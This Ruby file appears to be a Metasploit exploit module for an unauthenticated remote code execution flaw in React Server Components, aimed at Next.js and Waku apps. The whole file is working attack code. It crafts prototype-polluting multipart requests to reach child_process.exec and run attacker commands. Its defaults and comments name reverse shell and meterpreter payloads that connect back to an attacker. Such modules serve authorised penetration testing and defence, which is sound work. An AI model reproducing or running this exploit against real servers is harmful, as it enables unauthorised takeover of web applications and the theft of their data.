##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  FRAMEWORKS = {
    'nextjs' => {
      module_access: "process.mainModule.require('child_process')",
      endpoint_method: :nextjs_endpoint,
      headers: { 'Next-Action' => '' },
      check_method: :check_nextjs,
      ref_idx_range: -> { (0..9).to_a },
      form_ref_value: ->(ref_idx) { "\"$@#{ref_idx}\"" }
    },
    'waku' => {
      module_access: "process.getBuiltinModule('child_process')",
      endpoint_method: :waku_endpoint,
      headers: { 'X-Waku-Router-Skip' => '["page:/","layout:/","root","route:/"]' },
      check_method: :check_waku,
      ref_idx_range: -> { [1] },
      form_ref_value: ->(_ref_idx) { '"$@0"' }
    }
  }.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Unauthenticated RCE in React Server Components (React2Shell)',
        'Description' => %q{
          A critical unauthenticated Remote Code Execution (RCE) vulnerability exists in React Server
          Components (RSC) Flight protocol. The vulnerability allows attackers to achieve prototype
          pollution during deserialization of RSC payloads by sending specially crafted multipart
          requests with "__proto__", "constructor", or "prototype" as module names.

          This module supports multiple vulnerable frameworks including Next.js and Waku.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Maksim Rogov',                                # Metasploit Module (Next.js)
          'Valentin Lobstein <chocapikk[at]leakix.net>', # Metasploit Module (Waku)
          'Lachlan Davidson',                            # Vulnerability Discovery
          'maple3142'                                    # Public Exploit
        ],
        'References' => [
          ['CVE', '2025-55182'],
          ['CVE', '2025-66478'],
          ['URL', 'https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components'],
          ['URL', 'https://gist.github.com/maple3142/48bc9393f45e068cf8c90ab865c0f5f3'],
          ['URL', 'https://www.vulncheck.com/blog/react2shell-beyond-nextjs']
        ],
        'Arch' => [ARCH_CMD],
        'Targets' => [
          [
            'Next.js - Unix Command',
            {
              'Framework' => 'nextjs',
              'Platform' => %w[unix linux],
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/reverse_nodejs',
                'FETCH_WRITABLE_DIR' => '/tmp'
              }
              # Tested with cmd/unix/reverse_nodejs
              # Tested with cmd/unix/reverse_bash
              # Tested with cmd/linux/http/x64/meterpreter/reverse_tcp
            }
          ],
          [
            'Next.js - Windows Command',
            {
              'Framework' => 'nextjs',
              'Platform' => %w[windows]
              # Tested with cmd/windows/http/x64/meterpreter/reverse_tcp
            }
          ],
          [
            'Waku - Unix Command',
            {
              'Framework' => 'waku',
              'Platform' => %w[unix linux],
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/reverse_nodejs',
                'FETCH_WRITABLE_DIR' => '/tmp'
              }
              # Tested with cmd/unix/reverse_nodejs
              # Tested with cmd/unix/generic
              # Tested with cmd/unix/reverse_bash
              # Tested with cmd/linux/http/x64/meterpreter/reverse_tcp
            }
          ],
          [
            'Waku - Windows Command',
            {
              'Framework' => 'waku',
              'Platform' => %w[windows]
              # Tested with cmd/windows/http/x64/meterpreter/reverse_tcp
            }
          ],
        ],
        'Payload' => {
          'BadChars' => '"',
          'Space' => 131068,
          'DisableNops' => true,
          'Encoder' => 'cmd/base64'
        },
        'DefaultTarget' => 0,
        'DisclosureDate' => '2025-12-03',
        'Notes' => {
          'AKA' => ['React2Shell'],
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => [REPEATABLE_SESSION]
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'Path to the React App', '/']),
      ]
    )
  end

  # Framework configuration helpers
  def framework_config
    FRAMEWORKS[target['Framework'] || 'nextjs']
  end

  # Variant generation helpers
  def get_function_variant
    base_methods = %w[
      constructor __defineGetter__ __defineSetter__ hasOwnProperty
      __lookupGetter__ __lookupSetter__ isPrototypeOf propertyIsEnumerable
      toString valueOf toLocaleString
    ]
    base_methods.flat_map { |method| ["#{method}:constructor", "#{method}:__proto__:constructor"] }.sample
  end

  def get_random_value
    random_string = Rex::Text.rand_text_alphanumeric(6..14).upcase
    ['""', '{}', '[]', 'null', 'true', 'false', "\"#{random_string}\""].sample
  end

  # Check methods
  def check
    send(framework_config[:check_method])
  end

  def check_nextjs
    random_id = Rex::Text.rand_text_alphanumeric(8..16).upcase
    res = send_payload("throw Object.assign(new Error('NEXT_REDIRECT'),{digest:`NEXT_REDIRECT;push;/#{random_id};307;`});")
    return CheckCode::Unknown("#{peer} - No response from web service") unless res

    return CheckCode::Appears if res.code == 303 && res.headers.to_s.include?("/#{random_id};push")

    CheckCode::Safe("The target #{target_uri} is not vulnerable")
  end

  def check_waku
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path),
      'method' => 'GET'
    )
    return CheckCode::Unknown("#{peer} - No response from web service") unless res

    body = res.body.to_s
    if body.include?('__WAKU_HYDRATE__') || body.include?('<meta name="generator" content="Waku"/>')
      return CheckCode::Detected('Waku framework detected - cannot reliably check exploitability without command execution')
    end

    CheckCode::Unknown('Waku blind RCE - cannot reliably check without command execution')
  end

  # Exploit methods
  def exploit
    config = framework_config
    send_payload("#{config[:module_access]}.exec(\"#{payload.encoded}\",{detached:true,stdio:'ignore'},function(){});")
  end

  # Payload building methods
  def build_malicious_chunk(ref_idx, reason, get_token, node_payload)
    {
      'then' => "$#{ref_idx}:then",
      'status' => 'resolved_model',
      'reason' => reason,
      'value' => { 'then' => '$B' }.to_json,
      '_response' => {
        '_prefix' => node_payload,
        '_formData' => {
          'get' => "$#{ref_idx}:#{get_token}"
        }
      }
    }.to_json
  end

  def build_post_data(node_payload)
    config = framework_config
    ref_idx = config[:ref_idx_range].call.sample
    reason = -(rand(1..9))

    post_data = Rex::MIME::Message.new

    post_data.add_part(
      build_malicious_chunk(ref_idx, reason, get_function_variant, node_payload),
      nil, nil, 'form-data; name="0"'
    )

    (1..rand(ref_idx..9)).each do |i|
      value = (i == ref_idx) ? config[:form_ref_value].call(ref_idx) : get_random_value
      post_data.add_part(value, nil, nil, "form-data; name=\"#{i}\"")
    end

    post_data
  end

  # Endpoint methods
  def nextjs_endpoint
    normalize_uri(target_uri.path)
  end

  def waku_endpoint
    normalize_uri(target_uri.path, 'RSC', 'R', "#{Rex::Text.rand_text_alphanumeric(8)}.txt")
  end

  # HTTP request methods
  def send_payload(node_payload)
    config = framework_config
    post_data = build_post_data(node_payload)
    send_request_cgi(
      'uri' => send(config[:endpoint_method]),
      'method' => 'POST',
      'headers' => config[:headers],
      'ctype' => "multipart/form-data; boundary=#{post_data.bound}",
      'data' => post_data.to_s
    )
  end
end
